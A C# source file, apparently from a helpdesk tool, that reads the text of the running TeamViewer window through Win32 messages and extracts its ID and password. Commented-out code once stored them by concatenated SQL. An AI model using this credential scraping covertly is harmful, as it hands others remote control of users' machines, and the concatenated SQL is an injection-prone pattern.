using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace HELPSTEIN_Frida
{
    class TeamViewer
    {
        DateTime dat1 = DateTime.Now;
       // public string teamViewerQuery = "";
       // public const string constSmallDelim = "','";

        private const int WM_GETTEXT = 0X000D;
        private const int WM_SETTEXT = 0X000C;

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool EnumChildWindows(IntPtr window, EnumWindowProc callback, IntPtr i);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr SendMessage(IntPtr hWnd, int msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int uMsg, int wParam, string lParam);

        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int uMsg, int wParam, IntPtr lParam);


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string lclassName, string windowTitle);

        [DllImport("user32.dll")]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);



        public static List<IntPtr> GetChildWindows(IntPtr parent)
        {
            List<IntPtr> result = new List<IntPtr>();
            GCHandle listHandle = GCHandle.Alloc(result);
            try
            {
                EnumWindowProc childProc = new EnumWindowProc(EnumWindow);
                EnumChildWindows(parent, childProc, GCHandle.ToIntPtr(listHandle));
            }
            finally
            {
                if (listHandle.IsAllocated)
                    listHandle.Free();
            }
            return result;
        }

        public static bool EnumWindow(IntPtr handle, IntPtr pointer)
        {
            GCHandle gch = GCHandle.FromIntPtr(pointer);
            List<IntPtr> list = gch.Target as List<IntPtr>;
            if (list == null)
            {
                throw new InvalidCastException("GCHandle Target could not be cast as List<IntPtr>");
            }
            list.Add(handle);
            //  You can modify this to check to see if you want to cancel the operation, then return a null here
            return true;
        }

        public delegate bool EnumWindowProc(IntPtr hWnd, IntPtr parameter);

        // получаем ИД и пароль Тим Вьювера ****************************** НАЧАЛО

        //public string get_TeamViewer_id_pass(bool argDoCheck = true, string argDelim = constSmallDelim, string argDelim2 = constSmallDelim, string argErrResult = "Не найден процесс TV!") //string argDelim = constSmallDelim, string argErrResult = "Не найден процесс TV!")
        //{

        public string get_TeamViewer_id_pass() //string argDelim = constSmallDelim, string argErrResult = "Не найден процесс TV!")
        {
            

            //string argDelim = " ";
            string argDelim2 = ";    ";
            string argErrResult = "Не найден процесс TV!";
            string strdate = dat1.ToString("yyyy.MM.dd HH:mm:ss");
           // teamViewerQuery += @"INSERT INTO public.team_viewer (id, date, full_text, id_team_viewer, password)  VALUES ";
            //if (!argDoCheck)
            //{
            //    return "";
            //}

            string result = argErrResult;
            string resultAll = "\n\n\nПОЛНЫЙ ТЕКСТ TeamViewer:\n";
            string currentline;

            //string pattern = "([0-9] ?)?([0-9]{3} ?){3}";
            string pattern = "([0-9]{1,3} ?){1,4}";
            bool isNextLineIsTVPass = false;
            List<string> teamviewerText = new List<string>();

            string mainWindowName = "TeamViewer";
            int resultLen = 200;

            // https://ru.stackoverflow.com/questions/92809/%D0%9A%D0%B0%D0%BA-%D0%BE%D0%B1%D1%80%D0%B0%D1%82%D0%B8%D1%82%D1%8C%D1%81%D1%8F-%D0%BA-%D0%BD%D1%83%D0%B6%D0%BD%D0%BE%D0%BC%D1%83-%D0%BE%D0%BA%D0%BD%D1%83-%D0%B5%D1%81%D0%BB%D0%B8-%D0%B7%D0%B0%D0%B3%D0%BE%D0%BB%D0%BE%D0%B2%D0%BA%D0%B8-%D1%83-%D0%B2%D1%81%D0%B5%D1%85-%D0%BE%D0%B4%D0%B8%D0%BD%D0%B0%D0%BA%D0%BE%D0%B2%D1%8B

            IntPtr procParentHandle = FindWindow(null, mainWindowName);
            if (procParentHandle != IntPtr.Zero)
            {
                result = "";               
                IntPtr resultHandle = Marshal.AllocHGlobal(resultLen);
                SendMessage(procParentHandle, WM_GETTEXT, resultLen, resultHandle);
                List<IntPtr> children = GetChildWindows(procParentHandle);
                foreach (IntPtr child in children)
                {
                    SendMessage(child, WM_GETTEXT, resultLen, resultHandle);
                   // Console.WriteLine(Marshal.PtrToStringAnsi(resultHandle));
                    teamviewerText.Add(Marshal.PtrToStringAnsi(resultHandle));

                }
                foreach (var item in teamviewerText)
                {
                    resultAll +=  item.ToString()+"\n";
                }
                result += argDelim2;

                foreach (var item in teamviewerText)
                {
                    currentline = item.ToString();
                    if (isNextLineIsTVPass)
                    {
                        result += currentline;
                        //Console.WriteLine("PASS ***********************************");
                       // teamViewerQuery += "('" + ids.ids + "','" + strdate + "','" + result + "')" + ";";
                        result += resultAll;
                        return result;
                    }

                    Regex r = new Regex(pattern);
                    Match m = r.Match(currentline);
                    if (m.Success)
                    {
                        //Console.WriteLine("ID ***********************************");
                        result = "\nID: " + currentline+"\nПАРОЛЬ: ";
                        isNextLineIsTVPass = true;
                        //return result;
                    }

                }
                //teamViewerQuery += "('" + ids.ids + "','" + strdate + "','" + result + ";" + "')" + ";";
            }
            //if (result.StartsWith(argErrResult)) { result = argErrResult + "','" + argErrResult + "','" + argErrResult; }
            // teamViewerQuery += "('" + ids.ids + "','" + strdate + "','" + result + "')" + ";";

            
            //Console.WriteLine(result);
            return result;
        }
    }
}
